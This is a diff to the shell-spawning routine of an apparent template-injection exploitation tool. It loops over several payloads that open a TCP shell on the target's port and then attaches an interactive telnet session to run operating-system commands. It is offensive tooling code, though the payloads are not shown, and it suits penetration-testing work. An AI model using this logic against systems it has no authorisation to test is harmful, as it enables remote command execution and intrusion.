@@ -206,34 +206,33 @@ def check_template_injection(channel):
     if tcp_shell_port:
 
         if channel.data.get('tcp_shell'):
-
-            current_plugin.tcp_shell(tcp_shell_port)
-
-            # Give some time to spawn the shell
-            time.sleep(1)
-
+            
             urlparsed = urlparse.urlparse(channel.base_url)
-
             if not urlparsed.hostname:
                 log.error("Error parsing hostname")
                 return
+                
+            for idx, _ in enumerate(current_plugin.tcp_shell(tcp_shell_port)):
+                
+                log.info('Spawn a shell on remote port %i with payload %i' % (tcp_shell_port, idx))
+                
+                time.sleep(1)
 
-            log.info('Connect to out-of-bound TCP shell spawned on port %i to run commands on the operating system' % (tcp_shell_port))
+                try:
+                    
+                    telnetlib.Telnet(urlparsed.hostname, tcp_shell_port, timeout = 5).interact()
 
-            try:
-                telnetlib.Telnet(urlparsed.hostname, tcp_shell_port, timeout = 5).interact()
-
-                # If telnetlib does not rise an exception, we can assume that
-                # ended correctly and return from `run()`
-                return
-            except Exception as e:
-                log.error(
-                    "Error connecting to %s:%i %s" % (
-                        urlparsed.hostname,
-                        tcp_shell_port,
-                        e
+                    # If telnetlib does not rise an exception, we can assume that
+                    # ended correctly and return from `run()`
+                    return
+                except Exception as e:
+                    log.error(
+                        "Error connecting to %s:%i %s" % (
+                            urlparsed.hostname,
+                            tcp_shell_port,
+                            e
+                        )
                     )
-                )
 
         else:
 
